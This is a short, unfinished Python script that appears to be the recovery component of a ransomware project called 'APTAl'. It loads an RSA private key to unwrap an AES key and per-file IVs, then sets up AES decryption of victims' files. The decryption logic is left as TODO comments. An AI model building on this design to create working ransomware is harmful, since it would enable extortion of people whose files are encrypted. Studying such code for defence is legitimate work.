import os
import sys

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
from RSACipher import RSACipher


def aboutAPTAl():
    print(""" who we are, explain our purpose and give an advice""")

def openthelock():
    """
        TODO Explain Function
    """
    rsa_private_key = open(Utils.rsa_private_key_path,"rb").read()
    cipher = RSACipher(rsa_private_key)

    pass_the_introduction = 5 # TODO -> determine the line 
    with open(Utils.enc_aesIV_file_store_path,"rb") as ivs_file:
        
        for i in range(pass_the_introduction):
            ivs_file.readline()

        aes_key = ivs_file.readline()
        #decrypt aes key

        for line in ivs_file.readlines():
            iv, which_file = line.strip().split(b":::::")
            # Decrypt iv and path with given RSA private key than write thedecrypted pairs to Utils.dec_aesIV_file_store_path


def startRescueFiles():
    """
        TODO Explain Function
    """
    with open(Utils.dec_aesIV_file_store_path,"rb") as ivs_file:

        aes_key = ivs_file.readline().strip()
        aes_cipher = AESCipher(aes_key)

        for line in ivs_file.readlines():
            iv, which_file = line.strip().split(b":::::")
            # Decrypt the encrypted files

def main():
    
    aboutAPTAl()
    openthelock()
    #startRescueFiles()


if __name__ == "__main__":
    main()